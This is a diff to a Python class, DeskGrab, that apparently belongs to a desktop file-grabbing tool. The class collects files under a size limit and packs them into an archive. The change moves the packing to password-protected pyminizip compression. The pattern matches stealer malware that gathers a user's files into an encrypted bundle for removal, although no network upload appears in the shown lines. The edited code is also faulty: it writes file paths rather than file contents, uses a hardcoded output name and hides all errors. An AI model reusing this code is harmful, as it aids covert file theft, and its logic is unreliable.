@@ -1,4 +1,5 @@
 import requests
+import pyminizip
 from zipfile import ZipFile
 import os
 
@@ -9,7 +10,7 @@ import os
 class DeskGrab:
 
     def __init__(self, ZipName, ZipPassword):
-        self.ZipName = ZipName + ".zip"
+        self.ZipName = ZipName + ".txt"
         self.ZipPassword = ZipPassword
         self.ForbExt = []
         self.SizeLimit = 8388608
@@ -30,12 +31,15 @@ class DeskGrab:
 
 
     def _createZip(self, file_list):
+        compress_level = 5
+        output_file = "test2.zip"
         # Creating the zipfile
         try:
-            with ZipFile(self.ZipName, "w") as zipobj:
+            with open(self.ZipName, "w") as fa:
                 for i in file_list:
-                    zipobj.write(i)
-                zipobj.close()
+                    fa.write(i)
+                fa.close()
+            pyminizip.compress(self.ZipName, None, output_file, self.ZipPassword, compress_level)
             return True
         except: return False
 
